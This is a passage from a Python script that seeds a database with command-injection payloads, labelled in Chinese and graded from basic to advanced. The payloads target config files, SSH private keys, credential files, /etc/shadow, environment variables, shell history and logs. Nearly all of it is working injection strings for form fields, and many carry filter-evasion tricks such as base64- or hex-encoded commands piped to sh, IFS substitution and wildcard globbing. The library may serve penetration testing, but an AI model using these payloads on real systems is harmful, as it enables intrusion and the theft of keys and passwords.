        "文件读取 · 通用 · 全路径find exec conf",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "中等",
        '127.0.0.1;/usr/bin/find /etc -name "*.conf" -exec /bin/cat {} \\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · 通配符find conf",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "中等",
        '127.0.0.1;/usr/bin/f?nd /etc -name "*.conf" -exec /bin/c?t {} \\; 2>/dev/null',
    ),
    # ---- 高级：编码/深层绕过 ----
    (
        "文件读取 · 通用 · base64 find conf",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "高级",
        '127.0.0.1;$(echo ZmluZCAvZXRjIC1uYW1lICIqLmNvbmYiIC1leGVjIGNhdCB7fSBcOw==|base64 -d|sh) 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · eval+base64读取conf",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "高级",
        '127.0.0.1;eval $(echo ZmluZCAvZXRjIC1uYW1lICIqLmNvbmYiIC1leGVjIGNhdCB7fSBcOw==|base64 -d) 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · hex for循环conf",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "高级",
        '127.0.0.1;$"\\146\\157\\162" f in $(find /etc -name "*.conf");do cat $f;done 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · 复合IFS+通配符conf",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "高级",
        '127.0.0.1;f?nd${IFS}/etc${IFS}-name${IFS}*.conf${IFS}-exec${IFS}c?t${IFS}{}${IFS}\\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · printf构造find conf",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "高级",
        '127.0.0.1;$(printf "\\146\\151\\156\\144 /etc -name \\042*.conf\\042 -exec cat {} \\\\073"|sh) 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find多配置目录",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "高级",
        '127.0.0.1;find /etc /usr/local/etc /opt -name "*.conf" -exec cat {} \\; 2>/dev/null',
    ),
]

# ============================================================================
# Group 5: SSH密钥 / 凭证 / 历史记录 等敏感文件
# ============================================================================
SENSITIVE_FILE_PAYLOADS = [
    # ---- 基础级 ----
    (
        "文件读取 · 通用 · cat SSH私钥 id_rsa",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat ~/.ssh/id_rsa 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · cat authorized_keys",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat ~/.ssh/authorized_keys 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · cat bash_history",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat ~/.bash_history 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · cat /root/.bash_history",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /root/.bash_history 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · cat mysql history",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat ~/.mysql_history 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · cat .env Web目录",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /var/www/.env 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · cat wp-config.php",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /var/www/wp-config.php 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · cat .gitconfig",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat ~/.gitconfig 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · cat /etc/crontab",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /etc/crontab 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · cat /proc/self/environ",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /proc/self/environ 2>/dev/null",
    ),
    # ---- 中等级 ----
    (
        "文件读取 · 通用 · find SSH密钥文件",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1; find / -name id_rsa -o -name id_dsa -o -name id_ecdsa 2>/dev/null | xargs cat 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · find .pem证书文件",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1; find / -name *.pem 2>/dev/null | xargs cat 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · grep递归密码关键词",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1; grep -rE 'password|passwd|pwd|secret' /var/www 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · grep递归数据库连接",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1; grep -rE 'mysql_connect|mysqli_connect|PDO|jdbc' /var/www 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · IFS cat id_rsa",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;cat${IFS}~/.ssh/id_rsa 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 全路径cat history",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;/bin/cat /root/.bash_history 2>/dev/null",
    ),
    # ---- 高级 ----
    (
        "文件读取 · 通用 · base64 cat id_rsa",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;$(echo Y2F0IH4vLnNzaC9pZF9yc2E=|base64 -d) 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 多敏感文件合并读取",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;cat ~/.ssh/id_rsa ~/.bash_history /etc/shadow /etc/crontab 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · find+exec多类型密钥",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "高级",
        r'127.0.0.1;find / \( -name "id_rsa" -o -name "*.pem" -o -name "*.key" -o -name ".env" \) -exec cat {} \\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · cat proc进程信息",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;cat /proc/self/cmdline /proc/self/environ 2>/dev/null|tr '\\0' '\\n'",
    ),
    (
        "文件读取 · 通用 · xxd解码cat id_rsa",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;$(echo 636174207e2f2e7373682f69645f727361|xxd -r -p|sh) 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · diff对比密码文件",
        "command-injection",
        "敏感文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;diff /etc/passwd /etc/shadow 2>/dev/null;cat /etc/passwd /etc/shadow 2>/dev/null",
    ),
]

# ============================================================================
# Group 6: 日志文件读取 — /var/log
# ============================================================================
LOG_READ_PAYLOADS = [
    (
        "文件读取 · 通用 · cat syslog",
        "command-injection",
        "日志文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /var/log/syslog 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · tail auth.log",
        "command-injection",
        "日志文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; tail -50 /var/log/auth.log 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · cat nginx access.log",
        "command-injection",
        "日志文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /var/log/nginx/access.log 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · cat apache2 access.log",
        "command-injection",
        "日志文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /var/log/apache2/access.log 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · find /var/log 全部日志",
        "command-injection",
        "日志文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; find /var/log -name *.log -exec cat {} \\; 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · grep error 日志",
        "command-injection",
        "日志文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1; grep -r error /var/log 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · grep IP地址 日志",
        "command-injection",
        "日志文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1; grep -rE '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}' /var/log 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · IFS cat syslog",
        "command-injection",
        "日志文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;cat${IFS}/var/log/syslog 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · head限制日志输出",
        "command-injection",
        "日志文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;find /var/log -name *.log -exec head -c 500 {} \\; 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · base64 cat auth.log",
        "command-injection",
        "日志文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;$(echo Y2F0IC92YXIvbG9nL2F1dGgubG9n|base64 -d) 2>/dev/null",
    ),
]


def main() -> None:
    conn = connect()
    seen_names = existing_keys(conn)
    seen_contents = existing_contents(conn)
    before = conn.execute(
        "SELECT COUNT(*) AS c FROM payloads WHERE is_pool_snapshot = 0 AND is_deleted = 0"
    ).fetchone()["c"]
    print(f"Payloads before: {before}")

    groups = [
        ("系统账户文件读取 (/etc/passwd, /etc/shadow)", PASSWD_READ_PAYLOADS),
        ("Web 源码文件查找 (/var/www *.php)", WEB_SOURCE_PAYLOADS),
        ("临时文件读取 (/tmp)", TMP_READ_PAYLOADS),
        ("配置文件遍历 (/etc *.conf)", CONF_READ_PAYLOADS),
        ("敏感文件读取 (SSH密钥/凭证/历史记录)", SENSITIVE_FILE_PAYLOADS),
        ("日志文件读取 (/var/log)", LOG_READ_PAYLOADS),
    ]
    total = 0
    for title, items in groups:
        print("\n" + "=" * 60)
        print(title)
        print("=" * 60)
        for item in items:
            if insert_payload(conn, seen_names, seen_contents, *item):
                total += 1

    conn.commit()

    after = conn.execute(
        "SELECT COUNT(*) AS c FROM payloads WHERE is_pool_snapshot = 0 AND is_deleted = 0"
    ).fetchone()["c"]
    print("\n" + "=" * 60)
    print(f"Inserted: {total}")
    print(f"Payloads before: {before}")
    print(f"Payloads after: {after}")
    print("=" * 60)

    # Summary by category
    stats = conn.execute(
        """
        SELECT category, target, COUNT(*) as cnt
        FROM payloads
        WHERE is_pool_snapshot = 0 AND is_deleted = 0
        GROUP BY category, target
        ORDER BY category, target
        """
    ).fetchall()
    for row in stats:
        print(f"  {row['category']:20s} | {row['target']:10s} | {row['cnt']:3d} payloads")

    conn.close()
    print("\nDone!")


if __name__ == "__main__":
    main()
